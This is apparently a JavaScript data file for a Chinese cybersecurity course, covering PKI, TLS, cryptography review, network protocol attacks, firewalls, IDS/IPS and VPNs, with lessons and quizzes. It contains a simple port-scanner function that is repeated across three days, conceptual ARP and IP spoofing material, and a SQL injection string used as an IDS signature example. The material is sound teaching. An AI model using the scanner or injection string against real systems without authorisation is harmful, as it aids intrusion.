│   └── Root CA 密钥 ≠ 签发证书密钥(Sub CA)
└── 密钥使用时间窗口控制
轮換 (Rotation)
├── CA 密钥定期更换
├── 旧密钥仍可用验签，但不再签发新证书
└── 平滑过渡（新旧证书并存一段时间）
归档 (Archival)
├── 历史密钥归档保存
├── 用于验证历史签名和解密历史数据
└── 安全归档存储
销毁 (Destruction)
├── 密钥不再需要 → 安全销毁
├── HSM 自毁机制
└── 加密擦除 (Crypto Erase)：只销毁密钥材料，数据仍在
\`\`\`
---
## 三、HSM 硬件安全模块
\`\`\`
HSM (Hardware Security Module) =
专用硬件设备，用于安全生成、存储和使用密钥
HSM 的核心功能：
├── 密钥在 HSM 内部生成 → 永不离设备
├── 所有密码操作在 HSM 内部完成
├── 防篡改外壳 → 物理攻击 → 自动销毁密钥
├── FIPS 140-2 Level 3/4 认证`,
  codeExample:{language:'python',code:'# PKI证书验证流程\nprint(\"=== PKI证书链验证 ===\\n\")\ncert_chain = [\n    (\"根CA\", \"自签名\", \"Trust Anchor\"),\n    (\"中间CA\", \"根CA签发\", \"Intermediate\"),\n    (\"服务器证书\", \"中间CA签发\", \"End-entity\"),\n]\nprint(\"证书链验证流程:\")\nfor name, issuer, role in cert_chain:\n    print(f\"  {name} ← 由{issuer} ← {role}\")\n\nprint(\"\\nX.509证书字段:\")\nfields = [\"版本\", \"序列号\", \"签名算法\", \"颁发者\", \"有效期\", \"主体\", \"公钥信息\"]\nfor i, f in enumerate(fields, 1):\n    print(f\"  {i}. {f}\")',description:'证书链验证'},
  quiz:[{"id":"q40-1","question":"PKI体系的核心信任锚是？","options":["RA", "证书库", "CA", "CRL"],"correctIndex":2,"explanation":"CA(Certificate Authority)是整个信任模型的根。"},{"id":"q40-2","question":"CRL的全称？","options":["Certificate Revocation List", "Certificate Renewal Log", "Central Registry List", "Client Request Log"],"correctIndex":0,"explanation":"证书吊销列表。"},{"id":"q40-3","question":"OCSP相比CRL的优势？","options":["更安全", "更实时(在线查询)", "更便宜", "不需要CA"],"correctIndex":1,"explanation":"OCSP提供实时的证书状态查询。"},{"id":"q40-4","question":"RA在PKI中的角色？","options":["颁发证书", "注册审核身份", "吊销证书", "管理密钥"],"correctIndex":1,"explanation":"RA(Registration Authority)负责身份审核和注册。"},{"id":"q40-5","question":"HSM的全称？","options":["Hardware Security Module", "High Security Monitor", "Host System Manager", "Hardware System Memory"],"correctIndex":0,"explanation":"硬件安全模块，用于安全存储密钥。"}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[40]||[],
});
allDays.push({
  id:'day-41',day:41,week:6,title:'TLS/SSL协议深度解析（加密技术）',
  objectives:['TLS协议演进历史','TLS 1.3握手流程详解','TLS 1.2 vs TLS 1.3全面对比'],
  content:`# Day 41：TLS/SSL协议深度解析
## 一、TLS协议演进历史
### 1.1 演化时间线
\`\`\`
1994: SSL 1.0 — 内部开发，从未发布（安全漏洞太多）
1995: SSL 2.0 — 首次发布，很快被发现多个严重漏洞
1996: SSL 3.0 — 完全重写，奠定现代TLS基础
1999: TLS 1.0 — SSL 3.0的标准化升级（RFC 2246）
2006: TLS 1.1 — 新增对CBC攻击的防护（RFC 4346）
2008: TLS 1.2 — 支持AEAD、SHA-256（RFC 5246）
2018: TLS 1.3 — 简化握手、前向保密强制（RFC 8446）
禁用时间线：
  ✓ SSL 2.0 → 2011年禁用（RFC 6176）
  ✓ SSL 3.0 → 2015年禁用（RFC 7568, POODLE）
  ✓ TLS 1.0 → 2020年禁用（PCI DSS/Browser）
  ✓ TLS 1.1 → 2020年禁用（PCI DSS/Browser）
\`\`\`
### 1.2 协议层结构
\`\`\`
┌──────────────────────────────────────────┐
│          Application Layer (HTTP)        │  ← 应用数据
├──────────────────────────────────────────┤
│          Handshake │ Alert │ CCS         │  ← TLS子协议
├──────────────────────────────────────────┤
│          Record Protocol                 │  ← TLS记录层
├──────────────────────────────────────────┤
│          TCP (可靠传输)                   │  ← 传输层
└──────────────────────────────────────────┘
TLS子协议说明：
  · Handshake：密钥协商和身份认证
  · Change Cipher Spec (CCS)：通知切换加密状态（TLS 1.3中废除）
  · Alert：错误和警告通知
  · Application Data：加密传输应用数据
\`\`\`
---
## 二、TLS 1.3握手流程详解
### 2.1 完整握手（1-RTT）
\`\`\`
Client                                           Server
  │                                               │
  │──── ClientHello ────────────────────────────→│
  │     · 支持的加密套件                            │
  │     · key_share (ECDHE公钥)                    │
  │     · 支持的签名算法                            │
  │     · PSK扩展（可选）                          │
  │                                               │
  │←─── ServerHello ────────────────────────────│
  │     · 选定的加密套件                            │
  │     · key_share (ECDHE公钥)                    │
  │     {EncryptedExtensions}                     │
  │     {Certificate}          ← 加密！            │
  │     {CertificateVerify}                        │
  │     {Finished}                                │
  │                                               │
  │──── {Finished} ─────────────────────────────→│
  │     {Application Data}                        │
  │                                               │
  │←─── {Application Data} ────────────────────│
  │                                               │
总RTT: 1 (vs TLS 1.2 的 2-RTT)
握手消息数: 4 (vs TLS 1.2 的 6-7)
\`\`\`
### 2.2 0-RTT恢复握手
\`\`\`
TLS 1.3的0-RTT（早期数据）特性：
前提：客户端和服务器之前建立过连接，拥有PSK
Client                                           Server
  │                                               │
  │──── ClientHello (PSK+key_share) ────────────→ │
  │──── {Early Application Data} ───────────────→ │  ← 0-RTT!
  │                                               │
  │←─── {ServerHello + EncryptedExtensions...} ── │
  │←─── {Finished + Application Data} ──────────  │
  │                                               │
  │──── {Finished} ─────────────────────────────→ │
优势：首包即可发送应用数据
风险：0-RTT数据有重放攻击风险（幂等操作必须做防护）
\`\`\`
---
## 三、TLS 1.2 vs TLS 1.3全面对比`,
  codeExample:{language:'python',code:'# TLS协议握手关键步骤\nprint(\"TLS 1.3 握手流程 (1-RTT)\\n\")\nsteps = [\n    \"ClientHello: 支持的加密套件+密钥交换参数\",\n    \"ServerHello: 选定加密套件+服务器密钥交换\",\n    \"  → 服务器证书 → 验证证书链\",\n    \"双方导出会话密钥 (前向保密)\",\n    \"握手完成 → 加密通信开始 \\n\"\n]\nfor i, step in enumerate(steps, 1):\n    print(f\"{i}. {step}\")\nprint(\"TLS 1.3 改进: 握手更快+算法更安全+前向保密强制\")',description:'TLS握手模拟'},
  quiz:[{"id":"q41-1","question":"TLS 1.3握手需要几轮往返？","options":["2-RTT", "1-RTT", "3-RTT", "0-RTT(首次)"],"correctIndex":1,"explanation":"TLS 1.3将握手简化为1-RTT。"},{"id":"q41-2","question":"TLS 1.3废弃了哪些算法？","options":["仅RSA密钥交换", "AES-GCM", "SHA-256", "ECDHE"],"correctIndex":0,"explanation":"TLS 1.3仅保留AEAD加密套件，废弃RSA密钥交换。"},{"id":"q41-3","question":"前向保密(Forward Secrecy)的含义？","options":["加密速度更快", "长期私钥泄露不影响历史通信", "可以解密过去", "只能前向传播"],"correctIndex":1,"explanation":"每会话独立密钥，过去通信安全不受影响。"},{"id":"q41-4","question":"SNI(Server Name Indication)的作用？","options":["加速TLS", "同一IP托管多个HTTPS站点", "加密域名", "隐藏服务器"],"correctIndex":1,"explanation":"SNI让服务器知道客户端要访问哪个域名。"},{"id":"q41-5","question":"Wireshark如何解密TLS流量？","options":["暴力破解", "需要导入服务器私钥或SSLKEYLOGFILE", "发送特殊请求", "修改网络配置"],"correctIndex":1,"explanation":"需要密钥材料才能解密TLS流量。"}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[41]||[],
});
allDays.push({
  id:'day-42',day:42,week:6,title:'六周总结与测验（加密技术）',
  objectives:['第六周知识地图','每日精华回顾','核心对比表汇总'],
  content:`# Day 42：第六周总结与测验
\`\`\`
                    ┌─────────────────────────┐
                    │     密码学知识体系       │
                    └───────────┬─────────────┘
                                │
          ┌─────────────────────┼─────────────────────┐
          │                     │                     │
    ┌─────▼─────┐       ┌──────▼──────┐      ┌───────▼───────┐
    │ 对称加密   │       │ 非对称加密   │      │  哈希函数      │
    │ (Day 32/36)│       │ (Day 33/37) │      │  (Day 34/38)  │
    ├───────────┤       ├─────────────┤      ├───────────────┤
    │· AES      │       │· RSA        │      │· SHA-256     │
    │· DES/3DES │       │· ECC        │      │· SM3         │
    │· SM4      │       │· DH/ECDH    │      │· MD5 (退役)  │
    │· 工作模式  │       │· 签名/加密   │      │· 生日攻击    │
    └─────┬─────┘       └──────┬──────┘      └───────┬───────┘
          │                     │                     │
          └─────────────────────┼─────────────────────┘
                                │
                    ┌───────────▼───────────┐
                    │    PKI体系 (Day 35/40) │
                    ├───────────────────────┤
                    │· CA/RA/CRL/OCSP       │
                    │· X.509证书结构         │
                    │· 密钥生命周期          │
                    │· Certificate Transparency│
                    └───────────┬───────────┘
                                │
                    ┌───────────▼───────────┐
                    │    TLS/SSL (Day 41)    │
                    ├───────────────────────┤
                    │· TLS 1.2 vs TLS 1.3   │
                    │· 握手流程              │
                    │· 加密套件安全分析       │
                    │· 常见攻击(DROWN等)     │
                    └───────────────────────┘
\`\`\`
---
### Day 32：对称加密算法详解
\`\`\`
核心掌握：
  · AES-128/192/256的分组大小(128位)和密钥长度
  · 5种工作模式：ECB(不推荐)/CBC/CTR/GCM(推荐)/CFB
  · GCM = CTR + GMAC = 加密+认证 (AEAD)
  · SM4：中国国密对称算法
\`\`\`
### Day 33：非对称加密算法详解
\`\`\`
核心掌握：
  · RSA安全性 = 大数分解困难性
  · ECC优势：256位ECC ≈ 3072位RSA安全强度
  · 公钥加密 → 用接收方公钥
  · 数字签名 → 用发送方私钥
  · DH/ECDHE → 密钥协商，提供前向保密
\`\`\`
### Day 34：哈希函数深入
\`\`\`
核心掌握：
  · 哈希三大安全属性：抗原像性、抗第二原像性、抗碰撞性
  · MD5(128位)和SHA-1(160位)已不安全
  · 生日攻击复杂度：O(2^(n/2))
  · 密码存储演化：明文→Hash→Hash+Salt→Slow Hash→Argon2id
\`\`\`
### Day 35：数字签名与PKI体系
\`\`\`
核心掌握：
  · 数字签名流程：Hash→私钥签名→公钥验证
  · PKI五要素：CA/RA/CRL/OCSP/密钥管理
  · X.509证书：版本号、序列号、颁发者、有效期、主体、公钥、扩展
  · 信任模型：层级(Root CA)、网状(PGP)、桥接
\`\`\`
### Day 36：分组密码工作模式与实战
\`\`\`
核心掌握：
  · ECB致命缺陷：相同明文→相同密文（企鹅效应）
  · CBC填充Oracle攻击 → Encrypt-then-MAC 或迁移GCM
  · CTR Nonce重用 → Two-time pad → 密钥流抵消
  · AEAD是现代推荐的唯一选择
\`\`\``,
  codeExample:{language:'python',code:'print(\"=== 第六周密码学核心速记 ===\\n\")\nitems = [\n    (\"AES-256\", \"对称加密 | 分组128位 | 密钥256位\"),\n    (\"RSA-2048\", \"非对称 | 大质因数分解 | 公钥加密私钥解密\"),\n    (\"ECC P-256\", \"非对称 | 椭圆曲线 | 256位≈3072位RSA\"),\n    (\"SHA-256\", \"哈希 | 256位输出 | 抗碰撞安全\"),\n    (\"GCM\", \"认证加密模式 | 加密+MAC\"),\n    (\"TLS 1.3\", \"1-RTT握手 | 仅AEAD | 前向保密\"),\n    (\"PKI\", \"CA→RA→证书库→CRL/OCSP\"),\n    (\"数字签名\", \"私钥签名 | 公钥验证 | 完整+不可否认\"),\n]\nfor name, desc in items:\n    print(f\"[{name}] {desc}\")',description:'第六周密码学总复习'},
  quiz:[{"id":"q42-1","question":"AES密钥长度不包括？","options":["128位", "192位", "256位", "64位"],"correctIndex":3,"explanation":"AES支持128/192/256位密钥。"},{"id":"q42-2","question":"ECC P-256等效于RSA多少位？","options":["1024位", "2048位", "3072位", "4096位"],"correctIndex":2,"explanation":"256位ECC≈3072位RSA安全强度。"},{"id":"q42-3","question":"当前最推荐的认证加密模式？","options":["ECB", "CBC", "GCM", "CFB"],"correctIndex":2,"explanation":"GCM提供加密+认证，是TLS 1.3推荐模式。"},{"id":"q42-4","question":"数字签名的私钥用于？","options":["加密数据", "生成签名", "验证签名", "解密数据"],"correctIndex":1,"explanation":"私钥→签名；公钥→验证。"},{"id":"q42-5","question":"PKI中验证证书链的终点是？","options":["中间CA", "服务器证书", "根CA(自签名)", "RA"],"correctIndex":2,"explanation":"信任链终点是根CA的自签名证书。"}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[42]||[],
});
allDays.push({
  id:'day-43',day:43,week:7,title:'网络协议安全（网络安全）',
  objectives:['TCP/IP协议栈安全全景','ARP协议攻击与防御','IP协议安全'],
  content:`# Day 43：网络协议安全
## 一、TCP/IP协议栈安全全景
### 1.1 TCP/IP四层模型与安全威胁
\`\`\`
    OSI          TCP/IP           安全威胁示例
┌─────────┐  ┌──────────┐  ┌──────────────────────────────┐
│  应用层  │  │          │  │ HTTP劫持、DNS投毒、SMTP伪造   │
│  表示层  │  │  应用层   │  │ SSL/TLS降级、SSH中间人        │
│  会话层  │  │          │  │ Cookie窃取、会话劫持          │
├─────────┤  ├──────────┤  ├──────────────────────────────┤
│  传输层  │  │  传输层   │  │ TCP劫持、SYN Flood、UDP Flood │
├─────────┤  ├──────────┤  ├──────────────────────────────┤
│  网络层  │  │ 互联网层  │  │ IP欺骗、Smurf攻击、分片攻击   │
├─────────┤  ├──────────┤  ├──────────────────────────────┤
│ 数据链路层│ │ 网络接口层 │  │ ARP欺骗、MAC泛洪、VLAN跳跃   │
│  物理层  │  │          │  │ 线缆窃听、电磁泄露            │
└─────────┘  └──────────┘  └──────────────────────────────┘
\`\`\`
### 1.2 协议安全基本原则
\`\`\`
协议设计安全的四个原则（RFC 3552）：
① 加密优先：能加密就加密，避免明文传输
② 认证必选：通信双方身份必须经过认证
③ 完整性保护：数据在传输中不可被篡改
④ 抗重放：每条消息应包含防止重放的机制（时间戳/序号）
\`\`\`
---
## 二、ARP协议攻击与防御
### 2.1 ARP欺骗原理
\`\`\`
正常ARP流程：                        ARP欺骗攻击：
A想知道B的MAC                        攻击者C冒充B
  │                                    │
  │  ARP Request                      │  ARP Reply (伪造)
  │  "谁是192.168.1.2？"              │  "192.168.1.2 的MAC
  │  ─────────→ 广播                  │   是 CC:CC:CC:CC:CC:CC"
  │           │                       │  ─────────→ A
  │  ARP Reply                        │
  │  "我是，MAC=BB:BB"                │  结果：
  │  ←───────── B                     │  A将发往B的流量全部发给C
  │                                    │  → MITM中间人攻击！
ARP协议的根本问题：无状态、无认证、无条件接受ARP Reply
\`\`\`
### 2.2 攻击影响
| 攻击类型 | 描述 | 影响 |
|----------|------|------|
| **ARP欺骗** | 伪造ARP响应，篡改IP-MAC映射 | 中间人攻击、流量窃听 |
| **ARP泛洪** | 发送大量伪造ARP请求 | 交换机CAM表溢出→广播所有帧 |
| **免费ARP欺骗** | 发送声称是网关的免费ARP | 局域网全部流量经攻击者 |
| **ARP DoS** | 将目标IP映射到不存在的MAC | 目标网络完全不可达 |
### 2.3 防御措施
\`\`\`
✅ 静态ARP表（小网络适用）
✅ DAI (Dynamic ARP Inspection) — 交换机验证ARP包
✅ DHCP Snooping + IP Source Guard — 绑定信任的IP-MAC
✅ ARP监控工具（arpwatch, XArp）
✅ 网络分段隔离敏感区域
✅ 使用IPv6（理论上移除了ARP，但使用NDP有类似攻击）
\`\`\`
---
## 三、IP协议安全
### 3.1 IP欺骗攻击
\`\`\`
IP欺骗：伪造IP报文中的源IP地址
攻击类型：
① 盲欺骗 (Blind Spoofing)：
  攻击者无法看到目标响应
  需要猜测TCP序列号
② 非盲欺骗：
  攻击者在同一网段，可嗅探流量
  → TCP会话劫持
③ 反射攻击：
  源IP＝目标IP → 服务器响应发向目标
  → DNS Amplification, NTP Amplification
④ Smurf攻击：
  发送ICMP Echo Request到广播地址
  源IP＝目标IP → 所有主机回复目标
\`\`\`
### 3.2 IP分片攻击
\`\`\``,
  codeExample:{language:'python',code:'import socket, struct\n\ndef scan_ports(host, ports):\n    \"\"\"简单端口扫描器\"\"\"\n    print(f\"扫描 {host}...\\n\")\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((host, port))\n        status = \"开放\" if result == 0 else \"关闭\"\n        if result == 0:\n            print(f\"  端口 {port}: {status}\")\n        s.close()\n\n# 常见安全相关端口\ncommon_ports = [22, 25, 53, 80, 443, 3389, 8080]\nprint(\"网络安全常见协议与端口:\")\nservices = {22:\"SSH\", 25:\"SMTP\", 53:\"DNS\", 80:\"HTTP\", 443:\"HTTPS\", 3389:\"RDP\", 8080:\"HTTP-Alt\"}\nfor p in common_ports:\n    print(f\"  {p}/TCP → {services[p]}\")',description:'网络扫描与安全检测'},
  quiz:[{"id":"q43-1","question":"ARP欺骗的原理？","options":["修改MAC地址", "伪造ARP响应将IP映射到攻击者MAC", "DNS劫持", "IP欺骗"],"correctIndex":1,"explanation":"ARP欺骗=伪造ARP应答映射。"},{"id":"q43-2","question":"DNS缓存投毒的危害？","options":["用户访问合法域名被导向恶意IP", "网络变慢", "硬盘损坏", "内存泄漏"],"correctIndex":0,"explanation":"DNS投毒=劫持域名解析。"},{"id":"q43-3","question":"DNSSEC解决什么问题？","options":["加速DNS", "保证DNS应答的完整性和真实性", "加密DNS", "隐藏域名"],"correctIndex":1,"explanation":"DNSSEC用数字签名保护DNS数据。"},{"id":"q43-4","question":"SYN Flood属于什么攻击？","options":["应用层DoS", "传输层DoS(SYN半连接)", "漏洞利用", "社会工程"],"correctIndex":1,"explanation":"SYN Flood耗尽服务器半连接队列。"},{"id":"q43-5","question":"TCP劫持需要什么条件？","options":["仅知道IP", "预测正确的SEQ/ACK序列号", "物理接触", "管理员密码"],"correctIndex":1,"explanation":"TCP劫持需要猜测或获取序列号。"}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[43]||[],
});
allDays.push({
  id:'day-44',day:44,week:7,title:'防火墙技术（网络安全）',
  objectives:['防火墙概述与演进','包过滤防火墙','状态检测防火墙'],
  content:`# Day 44：防火墙技术
## 一、防火墙概述与演进
### 1.1 防火墙定义
\`\`\`
防火墙 = 在不同网络区域之间实施访问控制的设备或系统
核心功能：
  ① 访问控制：根据策略允许/拒绝流量
  ② 网络隔离：划分不同安全区域
  ③ 日志审计：记录所有通过的流量
  ④ NAT转换：隐藏内部网络结构
  ⑤ VPN终结：安全隧道连接点
\`\`\`
### 1.2 五代防火墙演进
\`\`\`
┌──────────┬───────────────┬──────────────────────────┐
│   代际    │     技术      │         关键能力          │
├──────────┼───────────────┼──────────────────────────┤
│ 第一代    │ 包过滤 (ACL)  │ 基于IP/端口/协议的允许拒绝 │
│ 第二代    │ 状态检测       │ 记录连接状态，动态规则      │
│ 第三代    │ 应用代理       │ 深度解析应用层协议         │
│ 第四代    │ UTM           │ 集成IDS/IPS/AV/反垃圾邮件  │
│ 第五代    │ NGFW          │ 应用识别+用户身份+威胁情报  │
└──────────┴───────────────┴──────────────────────────┘
\`\`\`
---
## 二、包过滤防火墙
### 2.1 工作原理
\`\`\`
包过滤防火墙检查每个IP包的头部信息：
┌────────────────────────────────────────────┐
│  检查字段：                                  │
│  · 源IP地址                                 │
│  · 目标IP地址                               │
│  · 源端口                                   │
│  · 目标端口                                 │
│  · 协议类型（TCP/UDP/ICMP）                 │
│  · TCP标志位（SYN/ACK/FIN/RST）             │
│  · 网络接口（入/出方向）                     │
└────────────────────────────────────────────┘
ACL处理流程：
  匹配第一条规则 → 执行动作(允许/拒绝) → 停止匹配
  不匹配任何规则 → 执行默认策略
关键设计原则：
  ✅ 默认拒绝 (Default Deny)："没明确允许的就是禁止的"
  ❌ 默认允许："没明确禁止的就是允许的"（不安全！）
\`\`\`
### 2.2 ACL规则示例
\`\`\`
Cisco ACL示例：
! 允许内部网络访问Web服务
access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 80
access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 443
! 允许已建立连接的回程流量
access-list 101 permit tcp any 192.168.1.0 0.0.0.255 established
! 拒绝来自已知恶意IP的流量
access-list 101 deny ip 10.0.0.0 0.255.255.255 any
! 默认拒绝所有
access-list 101 deny ip any any log
! 应用到接口
interface GigabitEthernet0/0
ip access-group 101 in
\`\`\`
### 2.3 优缺点
| 优点 | 缺点 |
|------|------|
| 速度快（仅检查头部） | 无状态（不知道连接上下文） |
| 实现简单 | 无法识别应用层协议 |
| 资源消耗低 | 容易配置错误 |
| 透明性好 | 不能防御应用层攻击 |
---
## 三、状态检测防火墙
### 3.1 状态表机制
\`\`\`
状态检测防火墙维护连接状态表：
连接建立时：
  Client→Server: SYN →
    防火墙记录：(SrcIP, DstIP, SrcPort, DstPort, TCP=SYN_SENT)
  Server→Client: SYN+ACK ←
    防火墙更新：(SrcIP, DstIP, SrcPort, DstPort, TCP=ESTABLISHED)
回程流量：`,
  codeExample:{language:'python',code:'import socket, struct\n\ndef scan_ports(host, ports):\n    \"\"\"简单端口扫描器\"\"\"\n    print(f\"扫描 {host}...\\n\")\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((host, port))\n        status = \"开放\" if result == 0 else \"关闭\"\n        if result == 0:\n            print(f\"  端口 {port}: {status}\")\n        s.close()\n\n# 常见安全相关端口\ncommon_ports = [22, 25, 53, 80, 443, 3389, 8080]\nprint(\"网络安全常见协议与端口:\")\nservices = {22:\"SSH\", 25:\"SMTP\", 53:\"DNS\", 80:\"HTTP\", 443:\"HTTPS\", 3389:\"RDP\", 8080:\"HTTP-Alt\"}\nfor p in common_ports:\n    print(f\"  {p}/TCP → {services[p]}\")',description:'网络扫描与安全检测'},
  quiz:[{"id":"q44-1","question":"下一代防火墙(NGFW)新增什么能力？","options":["包过滤", "应用识别+IPS集成", "仅NAT", "仅VPN"],"correctIndex":1,"explanation":"NGFW=传统防火墙+应用识别+IPS。"},{"id":"q44-2","question":"DMZ通常放什么服务器？","options":["数据库", "对公网提供服务的服务器(Web/Mail)", "域控制器", "开发环境"],"correctIndex":1,"explanation":"DMZ隔离外网可访问的服务。"},{"id":"q44-3","question":"包过滤防火墙检查什么？","options":["应用内容", "IP地址+端口(网络/传输层)", "用户身份", "加密内容"],"correctIndex":1,"explanation":"包过滤检查IP头+TCP/UDP头。"},{"id":"q44-4","question":"WAF主要防护什么？","options":["DDoS", "Web应用层攻击(SQL注入/XSS)", "网络扫描", "病毒"],"correctIndex":1,"explanation":"WAF专防HTTP/HTTPS应用层攻击。"},{"id":"q44-5","question":"防火墙策略最后一条通常是什么？","options":["允许所有", "默认拒绝(Deny All)", "日志记录", "转发"],"correctIndex":1,"explanation":"默认拒绝原则:最后一条Deny All。"}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[44]||[],
});
allDays.push({
  id:'day-45',day:45,week:7,title:'入侵检测系统（IDS/IPS）（网络安全）',
  objectives:['IDS vs IPS：核心区别','检测方法深度分析','部署架构与模式'],
  content:`# Day 45：入侵检测系统（IDS/IPS）
## 一、IDS vs IPS：核心区别
### 1.1 关键差异
\`\`\`
┌──────────────┬─────────────────────┬─────────────────────┐
│    特性       │     IDS (检测)       │     IPS (防御)       │
├──────────────┼─────────────────────┼─────────────────────┤
│ 部署方式      │ 旁路 (镜像流量/SPAN) │ 串联 (inline)        │
│ 对网络影响    │ 无影响（被动监听）    │ 引入延迟             │
│ 阻断能力      │ ❌ 只能告警           │ ✅ 可以主动阻断       │
│ 故障影响      │ 故障不影响业务        │ 故障可导致网络中断    │
│ 签名模式      │ 检出→告警            │ 检出→阻断           │
│ 性能要求      │ 较低                 │ 较高                 │
│ 常见缩写      │ NIDS (网络)/HIDS(主机)│ NIPS/HIPS            │
└──────────────┴─────────────────────┴─────────────────────┘
\`\`\`
### 1.2 IDS告警 vs IPS阻断
\`\`\`
IDS模式（旁路部署）：                 IPS模式（串联部署）：
  Internet                             Internet
     │                                    │
     ▼                                    ▼
  ┌─────┐     正常流量               ┌─────┐
  │交换机│←───────────→              │ IPS │←─ 所有流量必须通过
  └──┬──┘                            └──┬──┘
     │ SPAN/镜像                         │
     ▼                                   ▼
  ┌─────┐                            正常流量/阻断恶意流量
  │ IDS │←─ 被动复制流量              ┌─────┐
  └──┬──┘                            │交换机│
     │                                └──┬──┘
     ▼                                    ▼
  告警（不影响流量）                   正常业务流量
IDS部署优势：不影响现有网络，无单点故障风险
IPS部署优势：实时阻断攻击，但引入延迟和单点故障风险
\`\`\`
---
## 二、检测方法深度分析
### 2.1 四种检测方法
\`\`\`
① 基于签名的检测 (Signature-based)：
  匹配已知攻击模式的规则
  ✅ 低误报率、精确的攻击识别
  ❌ 无法检测0-day攻击、变种攻击
  示例规则：检测 "SELECT * FROM users WHERE id = ' OR 1=1"
② 基于异常的检测 (Anomaly-based)：
  建立正常基线→检测偏离
  ✅ 可检测未知攻击、0-day
  ❌ 高误报率、需训练期
  基线示例：某服务器通常每天1000次MySQL查询
        今天突然100000次 → 异常告警
③ 基于协议的检测 (Protocol-based)：
  检查是否符合RFC规范
  ✅ 检测协议滥用、畸形报文
  ❌ 特定场景可能误报
  示例：HTTP请求中包含二进制数据（可能是缓冲区溢出）
④ 基于信誉的检测 (Reputation-based)：
  使用威胁情报数据库
  ✅ 快速阻断已知恶意源
  ❌ 依赖情报更新及时性
  来源：已知C2 IP列表、恶意域名、Tor出口节点
\`\`\`
### 2.2 网络安全厂商对比
\`\`\`
┌──────────────┬──────────┬──────────────┬──────────────┐
│    工具       │   类型    │   检测方法    │    特点       │
├──────────────┼──────────┼──────────────┼──────────────┤
│ Snort        │ NIDS/IPS │ 签名+协议     │ 开源鼻祖      │
│ Suricata     │ NIDS/IPS │ 签名+协议     │ 多线程高性能  │
│ Zeek (Bro)   │ NSM      │ 协议+行为     │ 深度网络取证  │
│ SecurityOnion│ 集成平台 │ 混合          │ 完整的NSM方案 │
│ OSSEC/Wazuh  │ HIDS     │ 日志+完整性   │ 主机层检测    │
│ Snort/Suricata│ NIDS/IPS│ 签名+协议     │ 主流开源      │
└──────────────┴──────────┴──────────────┴──────────────┘
\`\`\`
---
## 三、部署架构与模式
### 3.1 传感器位置选择
\`\`\`
┌──────────────────────────────────────────────────┐`,
  codeExample:{language:'python',code:'import socket, struct\n\ndef scan_ports(host, ports):\n    \"\"\"简单端口扫描器\"\"\"\n    print(f\"扫描 {host}...\\n\")\n    for port in ports:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((host, port))\n        status = \"开放\" if result == 0 else \"关闭\"\n        if result == 0:\n            print(f\"  端口 {port}: {status}\")\n        s.close()\n\n# 常见安全相关端口\ncommon_ports = [22, 25, 53, 80, 443, 3389, 8080]\nprint(\"网络安全常见协议与端口:\")\nservices = {22:\"SSH\", 25:\"SMTP\", 53:\"DNS\", 80:\"HTTP\", 443:\"HTTPS\", 3389:\"RDP\", 8080:\"HTTP-Alt\"}\nfor p in common_ports:\n    print(f\"  {p}/TCP → {services[p]}\")',description:'网络扫描与安全检测'},
  quiz:[{"id":"q45-1","question":"IDS和IPS的核心区别？","options":["无区别", "IDS检测告警/IPS阻止攻击", "IDS只能看网络", "IPS速度更慢"],"correctIndex":1,"explanation":"IDS=Detection(检测)，IPS=Prevention(阻断)。"},{"id":"q45-2","question":"基于签名的检测局限？","options":["太慢", "无法检测0-day未知攻击", "太贵", "需要硬件"],"correctIndex":1,"explanation":"签名只能匹配已知攻击模式。"},{"id":"q45-3","question":"Snort规则中\"alert\"动作表示？","options":["丢弃数据包", "生成告警", "忽略", "记录并放行"],"correctIndex":1,"explanation":"alert=生成告警并记录。"},{"id":"q45-4","question":"HIDS部署在？","options":["网络边界", "单个主机上", "云端", "交换机"],"correctIndex":1,"explanation":"HIDS(Host-based IDS)部署在主机。"},{"id":"q45-5","question":"误报(False Positive)指？","options":["攻击未检测到", "正常行为被误判为攻击", "所有告警", "系统故障"],"correctIndex":1,"explanation":"FP=误报=正常被判为攻击。"}],
  recommendedTools:weekToolMap[7]?.tools||[],labEnvironments:weekToolMap[7]?.labs||[],expertNotes:dayExpertNotes[45]||[],
});
allDays.push({
  id:'day-46',day:46,week:7,title:'VPN技术（网络安全）',
  objectives:['VPN基础概念','IPsec VPN深度解析','SSL/TLS VPN'],
  content:`# Day 46：VPN技术
## 一、VPN基础概念
### 1.1 VPN分类
\`\`\`
VPN技术全景：
  ┌─────────────────────────────────────────┐
  │              VPN技术分类                  │
  ├─────────────────────────────────────────┤
  │                                          │
  │  按OSI层：                               │
  │    · L2 VPN：PPTP, L2TP                 │
  │    · L3 VPN：IPsec, GRE                 │
  │    · L4/L7 VPN：SSL VPN, WireGuard       │
  │                                          │
  │  按部署模式：                             │
  │    · Site-to-Site：站点到站点（网关到网关） │
  │    · Remote Access：远程接入（客户端到网关）│
  │    · Client-to-Client：端到端             │
  │                                          │
  │  按实现方式：                             │
  │    · 硬件VPN网关                          │
  │    · 软件VPN客户端                        │
  │    · 云VPN服务                            │
  └─────────────────────────────────────────┘
\`\`\`
### 1.2 VPN核心安全目标
\`\`\`
VPN必须保证：
  ✅ 机密性 — 数据加密（DES→3DES→AES→ChaCha20）
  ✅ 完整性 — 防篡改（HMAC、AEAD）
  ✅ 认证 — 身份验证（Pre-shared Key、证书、EAP）
  ✅ 抗重放 — 序列号/时间戳防重放
  ✅ 密钥管理 — 安全密钥交换和更新
\`\`\`
---
## 二、IPsec VPN深度解析
### 2.1 协议栈回顾
\`\`\`
IPsec协议栈：
    ┌─────────────┐
    │  IKEv2      │ ← 密钥协商（UDP 500/4500）
    ├─────────────┤
